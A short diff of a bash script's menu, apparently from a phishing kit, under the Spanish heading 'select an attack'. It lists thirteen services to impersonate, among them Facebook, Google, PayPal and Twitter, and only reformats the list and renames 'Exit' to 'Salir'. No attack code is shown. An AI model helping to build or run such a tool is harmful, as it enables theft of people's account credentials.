@@ -486,18 +486,20 @@ echo -e "-----------------------------------------------------------------------
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Seleciona Un Ataque ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}09${RED}]${ORANGE} Twitch       
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}10${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}11${RED}]${ORANGE} Snapchat	    	
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft 	${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}13${RED}]${ORANGE} Twitter  	
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook          
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram    
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        	    	
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft 	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix        	
 		${RED}[${WHITE}06${RED}]${ORANGE} Paypal                  
 	 	${RED}[${WHITE}07${RED}]${ORANGE} Tiktok        
 		${RED}[${WHITE}08${RED}]${ORANGE} Spotify
-		
-		       
-
-		 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}09${RED}]${ORANGE} Twitch  
+		${RED}[${WHITE}10${RED}]${ORANGE} Badoo  
+		${RED}[${WHITE}11${RED}]${ORANGE} Snapchat
+		${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	
+		${RED}[${WHITE}13${RED}]${ORANGE} Twitter 
+		${RED}[${WHITE}00${RED}]${ORANGE} Salir
 
 	EOF
 	
